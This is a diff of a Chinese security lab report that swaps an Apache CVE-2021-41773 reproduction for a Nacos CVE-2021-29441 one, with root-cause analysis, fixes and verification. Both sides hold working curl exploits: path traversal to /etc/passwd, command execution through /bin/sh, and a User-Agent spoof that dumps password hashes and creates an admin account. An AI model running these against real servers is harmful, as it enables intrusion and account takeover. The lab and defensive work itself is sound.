@@ -33,7 +33,7 @@
 | SAST | Bandit 1.7.9+ |
 | SCA | pip-audit 2.7.3+ |
 | 容器 | Docker Desktop + Docker Compose v2 |
-| 漏洞靶场 | Vulhub `httpd/CVE-2021-41773` |
+| 漏洞靶场 | Vulhub `nacos/CVE-2021-29441` |
 
 ---
 
@@ -333,135 +333,143 @@ No known vulnerabilities found
 
 ---
 
-## 4. 第二部分：CVE-2021-41773 的复现与分析
+## 4. 第二部分：CVE-2021-29441 的复现与分析
 
 ### 4.1 选择与准备
 
-选择 **CVE-2021-41773（Apache HTTP Server 2.4.49 路径穿越）**，理由：
+选 **CVE-2021-29441（Nacos < 1.4.1 认证绕过）**：CWE-290（Authentication Bypass by Spoofing），
+CVSS 3.1 **8.6**。理由：
 
-* 根因集中在**一个函数**（`ap_normalize_path()`），可以精确到代码行级分析；
-* 一条 `curl` 即可复现，前后对比毫无歧义；
-* 修复是**版本升级**，可验证性强，且两次实验配置完全一致，只变一个变量；
-* 它串起了三个经典问题：规范化顺序错误 + 过宽的文件系统授权 + 开启 CGI，
-  适合讨论纵深防御。
+* 根因是一个**可以直接引用的短路判断**——`AuthFilter` 信了 `User-Agent` 请求头；
+* 利用只要**两条 `curl`**，前后对比没有歧义；
+* 影响直达用户管理 API：既能读 bcrypt 哈希，也能**直接创建管理员**；
+* 修复有一个真实的坑：厂商虽然加了开关，但**默认是开着的**（见 4.4）。
 
-```bash
-git clone https://github.com/vulhub/vulhub.git
-cd vulhub/httpd/CVE-2021-41773
-docker compose up -d
-```
-
-或直接使用本仓库自带的等价环境（`cve/Dockerfile` 与 Vulhub 的配置逐行一致）：
+> 注意：Vulhub 镜像 `vulhub/nacos:1.4.0` 默认 `nacos.core.auth.enabled=false`，
+> 那样"谁都能访问"根本不是 CVE。所以本仓库自建镜像把认证**打开**——这正是 advisory
+> 写明的前提（"when configured to use authentication"）。
 
 ```bash
 cd cve
-docker compose up -d --build
+docker compose up -d --build        # 8848，首次构建会下载 1.4.0 发行包（约 100 MB）
 ```
 
-服务起在 `http://127.0.0.1:8080`，首页返回 `It works!`。
+Nacos 是 Spring Boot 应用，`up` 之后要等 30–60 秒。
 
 ### 4.2 攻击复现
 
 ```bash
-# 0) 确认 /icons/ 别名目录存在（由 httpd-autoindex.conf 提供）
-curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8080/icons/
+# 1) 基线：认证是开着的，匿名访问被拒
+curl -s -o /dev/null -w '%{http_code}\n' \
+  'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
+# -> 403  {"status":403,"error":"Forbidden","message":"unknown user!"}
 
-# 1) 路径穿越读取 /etc/passwd
-#    %2e 是 URL 编码的 '.'；--path-as-is 阻止 curl 在客户端替我们展开 ..
-curl --path-as-is \
-  'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+# 2) 绕过：同一个请求，多一个请求头
+curl -s -H 'User-Agent: Nacos-Server' \
+  'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
+# -> 200  {"totalCount":1,"pageItems":[{"username":"nacos","password":"$2a$10$..."}]}
 
-# 2) 因为启用 mod_cgi，同一手法可以走到 /bin/sh，形成命令执行
-curl --path-as-is --data 'echo;id' \
-  'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
+# 3) 影响：不提供任何凭据就创建一个管理员
+curl -s -X POST -H 'User-Agent: Nacos-Server' \
+  'http://127.0.0.1:8848/nacos/v1/auth/users?username=pwned&password=Passw0rd123'
+# -> 200  {"code":200,"message":"create user ok!","data":null}
 ```
 
-**实测输出**（2026-10-19，容器内执行，完整转录见 `cve/evidence/vulnerable.txt`）：
+**实测输出**（完整转录见 `cve/evidence/vulnerable.txt`）：
 
 ```
-2. Path traversal: GET /icons/.%2e/../../../../etc/passwd
-HTTP 200
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-...
->>> VULNERABLE: /etc/passwd was disclosed.
+1. Sanity check: GET /nacos/                              HTTP 200
 
-3. RCE: POST /cgi-bin/.%2e/../../../../bin/sh
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
->>> VULNERABLE: command execution confirmed.
+2. Baseline: GET /nacos/v1/auth/users  (no header)        HTTP 403
+   {"timestamp":"...","status":403,"error":"Forbidden","message":"unknown user!"}
+
+3. Bypass: same request with 'User-Agent: Nacos-Server'   HTTP 200
+   {"totalCount":1,"pageNumber":1,"pageItems":[
+      {"username":"nacos","password":"$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"}]}
+   >>> VULNERABLE: authentication bypassed; the user table and password hashes are readable.
+
+4. Impact: create an admin account through the same bypass
+   {"code":200,"message":"create user ok!","data":null}
+   >>> VULNERABLE: 'pwned4779' was created without any credentials
 ```
 
-> `--path-as-is` 是关键：不加它，curl 会先把 `/icons/.%2e/../` 归一化掉，
-> 请求根本不会离开文档根目录。
+拿到账号后直接在 `http://127.0.0.1:8848/nacos/` 登录，就是完整管理权限（命名空间、配置、服务列表）。
 
-> **本机装不上 Docker？** 同一套流程也可以在 GitHub runner 上跑：手动触发 `.github/workflows/cve-repro.yml`（Actions → *CVE reproduction (manual)* → *Run workflow*），两段转录会出现在该次运行的 **Summary** 和 `cve-evidence` artifact 里，带时间戳且可复跑。
-
-
-> ⬜ **待补截图**：`docs/screenshots/cve-exploit.png`
-> （漏洞环境中 `curl` 返回 `/etc/passwd` 内容 + `id` 命令执行结果）
-
-![漏洞环境复现：路径穿越读出 /etc/passwd 与命令执行](screenshots/cve-exploit.png)
+![漏洞环境复现：伪造 User-Agent 后读出用户表并创建管理员](screenshots/cve-exploit.png)
 
 ### 4.3 根因分析
 
-**缺陷位置**：`server/request.c` 中的 `ap_normalize_path()`——2.4.49 重写的新规范化函数。
+**缺陷位置**：`com.alibaba.nacos.core.auth.AuthFilter`。
 
-**缺陷本质**：函数在一次扫描里同时做两件事——
+开启认证后所有请求都要过这个过滤器，而它给**服务器之间的内部调用**留了一个短路：
 
-1. **解码**百分号编码（`%2e` → `.`）；
-2. **判断**当前段是否为应当折叠的 `.` / `..`。
-
-这两步的顺序反了：判断“是不是点段”时，字符**还是编码态**。于是
-
-```
-.%2e      # 不等于 ".."，因此不会被识别为穿越段
+```java
+// Nacos 1.4.0，简化示意
+if (userAgent.equals("Nacos-Server")) {
+    return chain.doFilter(request, response);   // 跳过全部鉴权
+}
 ```
 
-安然通过规范化，随后才被解码成真正的 `..`。交给核心映射函数的路径里，
-仍然存在一个生效的 `..`。
+短路成立的前提是"只有 Nacos 服务器会发这个头"。这个前提本身就是漏洞：
+**请求头是攻击者可控的数据，不是身份**。任何人都能敲出这个字符串。
 
-接着 `ap_core_translate()` 按 `Alias /icons/ ...` 把它映射到文件系统，
-却没有再校验结果是否仍在别名目录内。`..` 于是尽职地向上走了一层又一层。
+所以问题不是"少了一个检查",而是**把信任决定建立在一个可伪造的输入上**——CWE-290
+的典型形态。更糟的是这个短路跳过了**全部**授权（包括用户管理 API），
+影响才从"读一条配置"升级为"任意管理操作"。
 
-所以这不是“忘了做输入校验”，而是**校验器与解码器对同一个字符串的理解不一致**
-（规范化 / 解码顺序错误，典型的 canonicalisation 漏洞）。这正是 CWE-22 的形状：
-检查时解析出的名字，与最终打开的名字不是同一个。
+**配置前提**（advisory 明确写了"when configured to use authentication"）：
 
-**放大因素**（把“读文件”升级为“拿服务器”）：
+* `nacos.core.auth.enabled=false`（默认值，也是 Vulhub 镜像的取值）时，绕过是**不可见**的——
+  服务器本来就敞着，少不少那个检查没区别；
+* 所以这是**访问控制设计缺陷**，不是"默认配置不安全"。打开认证才让绕过有意义，
+  而**关掉认证不是修复**，只是把症状藏起来。
 
-| 配置 | 后果 |
-|---|---|
-| `<Directory /> Require all granted` | 逃逸后的路径被**授权**，`/etc/passwd`、应用密钥、云元数据（169.254.169.254）都可读 |
-| `LoadModule cgi_module` | 穿越可以落到 `/cgi-bin/` 下的 `/bin/sh`，以 `daemon` 身份执行任意命令 |
+**影响链**：
 
-同一个代码缺陷，在一种部署里是 7.5（信息泄露），在另一种部署里是 9.8（RCE）：
-**影响取决于配置，缺陷本身不取决。**
+```
+伪造请求头 ──► AuthFilter 短路 ──► /v1/auth/users
+                                  ├─ GET  → 用户表 + bcrypt 哈希（可离线爆破）
+                                  └─ POST → 创建管理员
+                                               └─► 完整控制台权限
+```
 
-**为什么第一次补丁不够**：2.4.50 加了“拒绝字面量 `%2e`”的过滤。过滤作用在编码态上，
-于是双重编码直接绕过——`%%32%65` 解一次是 `%2e`，再解一次就是 `.`。这就是
-CVE-2021-42013（CVSS 9.8）。2.4.51 放弃黑名单，改成：先完整解码 → 在解码后的字符串上
-折叠点段 → 任何会爬到根之上的路径直接拒绝。
-
-> 结论：**对编码后的输入做黑名单是必输的游戏；先规范化，再校验，最后才使用。**
+哈希是 bcrypt（`$2a$10$`），爆破很慢；但攻击者根本不用爆破——**直接新建一个管理员**更快、更安静。
 
 ### 4.4 修复
 
-`cve/Dockerfile.fixed` 只改一行：
+`cve/Dockerfile.fixed` 构建 **Nacos 1.4.1**——把硬编码的 `User-Agent` 短路放进开关的版本：
+
+```
+nacos.core.auth.enable.userAgentAuthWhite=true
+```
+
+**1.4.1 把这个开关默认设为 `true`**（为了兼容存量集群），所以**光升级版本并不能修好**。
+我们实测过：在未经修改的 1.4.1 上，伪造请求头依然能读到用户表。真正的修复是两步：
 
 ```diff
--FROM vulhub/httpd:2.4.49
-+FROM httpd:2.4.51
+-  NACOS_VERSION=1.4.0
++  NACOS_VERSION=1.4.1
++  nacos.core.auth.enable.userAgentAuthWhite=false
 ```
 
-其余配置（CGI 开启、`Require all granted`、autoindex）**完全保持不变**，
-从而把变量隔离为“规范化代码是否打了补丁”。如果攻击失效，只能归因于代码修复，
-而不是某个配置被顺手关掉了。
+又因为关掉白名单后，1.4.1 要求内部调用携带 **server identity**，所以还得补一对密钥，
+否则服务器会把**所有**请求都拒掉（包括控制台）：
 
-```bash
-docker compose down
-docker compose -f docker-compose.fixed.yml up -d --build
 ```
+nacos.core.auth.server.identity.key=lab1server
+nacos.core.auth.server.identity.value=lab1secret
+```
+
+三件事都做完，同样的请求才会被拒：
+
+```
+HTTP 403
+{"status":403,"error":"Forbidden","message":"Invalid server identity key or value,
+ Please make sure set `nacos.core.auth.server.identity.key` and
+ `nacos.core.auth.server.identity.value`, or open `nacos.core.auth.enable.userAgentAuthWhite`"}
+```
+
+教训：**"fixed in version X" 不等于 "fixed"**。要看 advisory、看 release notes，然后自己验证。
 
 ### 4.5 修复验证（含回归）
 
@@ -469,55 +477,41 @@ docker compose -f docker-compose.fixed.yml up -d --build
 powershell -ExecutionPolicy Bypass -File .\cve\verify-fix.ps1
 ```
 
-脚本不仅重放原始 payload，还重放**整个绕过家族**（双重编码、`%2f`、`/.%2e/`），
-并做回归检查：
+实测：
 
 ```
-[PASS] home page still returns 200                     <- 功能未受损
-[PASS] traversal rejected with 400/403/404
-[PASS] no /etc/passwd content in the body
-[PASS] no uid= in the response
-[PASS] no leak for /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hostname
-[PASS] no leak for /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
-[PASS] no leak for /.%2e/.%2e/.%2e/.%2e/etc/passwd
-[PASS] no leak for /icons/..%2f..%2f..%2f..%2fetc%2fpasswd
+1. Regression check: GET /nacos/
+[PASS] console still returns 200
+
+2. Bypass must fail: GET with 'User-Agent: Nacos-Server'
+GET /nacos/v1/auth/users?pageNo=1&pageSize=9 -> HTTP 403
+[PASS] returns 403 instead of 200
+[PASS] no user table in the body
+
+3. Creating an account must fail
+[PASS] no 'create user ok'
+
+4. Authentication is still enabled
+GET /nacos/v1/auth/users?pageNo=1&pageSize=9 (no credentials) -> HTTP 403
+[PASS] anonymous access still refused
+
 RESULT: fix verified -- all checks passed.
 ```
 
-实测状态码值得单独记一笔：2.4.51 对 `/icons/.%2e/...`、`/cgi-bin/.%2e/...`、`/.%2e/...`
-这些**在规范化阶段就能判定越界**的路径直接返回 **400 Bad Request**（不是 404）；
-只有带编码斜杠的 `/icons/..%2f..%2f..%2f..%2fetc%2fpasswd` 走到 404。
-两种都是拒绝，但报告里写的是实际看到的数——这也是我把断言从"必须是 404"放宽到
-"400/403/404 皆可，且不得含文件内容"的原因。
+第 4 项和前面几项一样重要：**"攻击失效是因为把认证关了"** 属于把功能改坏冒充修复。
+脚本明确断言匿名访问**依然**被拒。
 
-只修公告里那一个字符串等于做黑名单，2.4.50 的教训就在眼前；因此验证必须覆盖变体。
-
-> ⬜ **待补截图**：`docs/screenshots/cve-fixed.png`
-> （修复后同一命令返回 400，以及 `verify-fix` 的 PASS 汇总）
-
-![修复验证：同一请求返回 400，verify-fix 全部 PASS](screenshots/cve-fixed.png)
+![修复验证：同一请求返回 403，控制台仍 200，verify-fix 全部 PASS](screenshots/cve-fixed.png)
 
 ### 4.6 纵深防御建议
 
-版本升级是**真正的修复**；以下是缩小爆炸半径的加固，不能替代升级：
+* **永远不要用请求头做授权判断**。必须识别内部流量时，用攻击者猜不到的**密钥**
+  （`server.identity.key/value`）或 mTLS，并把豁免范围收窄到最少的路径。
+* 白名单开关保持关闭，节点下线时轮换 server identity。
+* 控制台和 API 放到内网策略后面——Nacos 本来就是内部组件，不该对公网可达。
+* 对"来自非集群节点的 `User-Agent: Nacos-Server`"告警。
+* 把控制台当管理面看待：独立凭据、代理层 2FA、审计日志外发。
 
-```apache
-<Directory />
-    AllowOverride none
-    Require all denied      # 不把整个文件系统交给服务器
-</Directory>
-```
-
-```yaml
-# docker-compose 层
-    read_only: true
-    user: "1000:1000"
-    security_opt: ["no-new-privileges:true"]
-    cap_drop: ["ALL"]
-```
-
-以及：只在必要目录启用 CGI、限制容器出网（阻断元数据 SSRF）、
-把 WAF 规则当作止血带而不是解药、订阅 CISA KEV 及时打补丁。
 
 ---
 
@@ -576,14 +570,14 @@ RS256 则用私钥签、公钥验），同时校验 `iss`/`aud`/`exp`/`nbf` 与�
 **4. 不审计第三方依赖会带来什么风险？**
 
 现代应用 80% 以上的代码来自依赖，攻击者不需要碰你的代码，只要你的一个传递依赖
-有已知漏洞（Log4Shell、Struts2、本次的 httpd）就能进入。而且漏洞披露到利用往往只有
+有已知漏洞（Log4Shell、Struts2、本次的 Nacos）就能进入。而且漏洞披露到利用往往只有
 几天，你没有时间临时评估。SCA 的价值是：生成可见的 SBOM、在 CI 里对已知 CVE 报警、
 把“该不该升级”变成流程而不是个人记忆。
 
 **5. 用 Docker + Vulhub 学习安全，比在本机直接装有漏洞的软件好在哪？**
 
 隔离与可丢弃：打穿了也只是容器，快照 / 重建即可复原；版本精确可复现，
-不会因为“我这台机器是 2.4.51”而复现失败；漏洞版与修复版可以并排对比，
+不会因为“我这台机器已经打了补丁”而复现失败；漏洞版与修复版可以并排对比，
 只改一个 tag；配置被固化成代码，评审者可复核；对教学而言，所有人的环境一致，
 评分可复现。
 
@@ -596,8 +590,9 @@ RS256 则用私钥签、公钥验），同时校验 `iss`/`aud`/`exp`/`nbf` 与�
 
 **7. 打了补丁之后，为什么还必须做回归测试？**
 
-因为修复往往改动的是公共路径（这里是 URI 规范化），很容易顺带弄坏正常请求：
-2.4.50 的修复本身就是“修好了穿越、却引入新的绕过”的反面教材。
+因为修复往往改动的是公共路径（这里是认证过滤器），很容易顺带弄坏正常请求：
+1.4.1 就是现成的例子——它加了开关却默认开着，升级完依然能被绕过；而关掉开关却不配
+server identity，连控制台都会被锁死。
 回归测试回答两个问题：修复是否**精准**（只挡住恶意，不影响正常），
 以及是否**引入新问题**（可用性、性能、兼容性）。没有回归的“修复”可能只是把功能关掉了。
 
@@ -627,6 +622,6 @@ RS256 则用私钥签、公钥验），同时校验 `iss`/`aud`/`exp`/`nbf` 与�
 - [ ] `docs/screenshots/ci-green.png` — 绿色流水线
 - [ ] `docs/screenshots/bandit.png` — Bandit Job Summary
 - [ ] `docs/screenshots/pip-audit.png` — pip-audit Job Summary
-- [ ] `docs/screenshots/cve-exploit.png` — 漏洞环境 `/etc/passwd` + `id`
-- [ ] `docs/screenshots/cve-fixed.png` — 修复后 400 + verify-fix PASS
+- [ ] `docs/screenshots/cve-exploit.png` — 漏洞环境 403 基线 + 200 泄露 + `create user ok!`
+- [ ] `docs/screenshots/cve-fixed.png` — 修复后 403 + verify-fix PASS
 - [ ] 首页按手册要求补齐：编号、题目、变体号、姓名、HDU 号
